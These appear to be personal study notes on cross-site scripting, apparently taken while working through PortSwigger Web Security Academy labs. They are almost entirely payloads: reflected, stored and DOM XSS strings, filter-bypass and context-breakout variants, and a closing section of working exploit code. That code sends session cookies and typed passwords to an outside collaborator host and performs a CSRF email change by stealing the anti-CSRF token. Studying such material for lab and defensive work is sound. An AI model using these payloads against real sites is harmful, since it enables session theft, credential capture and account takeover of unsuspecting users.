# basic attack

#apprentice 
#### reflected
in [[cause & sinks#reflected|this]] case: 
> `https://insecure-website.com/search?term=<script>alert(1)</script>`
#### stored
in [[cause & sinks#stored|this]] case:
> comment=`<script>alert(1)</script>`
#### DOM-based
in [[cause & sinks#DOM-based|this]] case
> `"><svg onload=alert(1)>`

---
# contexts
## between HTML tags
##### most tags and attributes blocked
`<>` -> `<§§>` -> body tag accepted ->`<body%20§§=1>` -> `onresize` accepted -> `<iframe src="https://vulnerable-website.com/?search="><body onresize=print()>" onload=this.style.width='100px'>`
##### all tags and attributes blocked except custom ones
`<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x'`
##### some SVG markup allowed
`<>` -> `<§§>` -> `<svg>`, `<animatetransform>`, `<title>`,`<image>` accepted-> `<svg><animatetransform%20§§=1>` -> `onbegin` accepted-> `"><svg><animatetransform onbegin=alert(1)>`
## in HTML tag attributes

- **close the tag** ->  `"><script>alert(1)</script>`
- **same tag** -> **new attribute** ->
	- `" autofocus onfocus=alert(1) x="` (`x="` to gracefully repair the following markup
	- `"onmouseover="alert(1)`
- **same tag** -> **same attribute** 
	 - `<a href="javascript:alert(1)">`
	 - hidden input -> `https://vulnerable-website.com/?'accesskey='x'onclick='alert(1)`
## XSS into JavaScript

##### Terminating the existing script 
context: `<script> ... var input = 'controllable data here'; ... </script>` 
- `</script><img src=1 onerror=alert(document.domain)>` (reason:HTML parsing first)
- single quote and backslash escaped -> `</script><script>alert(1)</script>`
##### Breaking out of a JavaScript string
- `'-alert(1)-'` OR `';alert(1)//`
  - back slash escape :  `\';alert(1)//` -> `\\';alert(1)//` -> `';alert(1)//`
##### Making use of HTML-encoding
context: `<a href="#" onclick="... var input='controllable data here'; ...">`
- `&apos;-alert(1)-&apos;`
##### XSS in JavaScript template literals
context: ``<script> ... var input = `controllable data here`; ... </script>`` 
- `${alert(1)}`

## XSS via client-side template injection
...

---
# exploits
## to steal cookies

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST', mode: 'no-cors', body:document.cookie });
</script>
```

## to capture passwords

```html
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

## to perform CSRF

```html
<script> 
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/my-account/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com') };
</script>
```

---

[XSS cheat-sheet from portswigger academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) #todo 
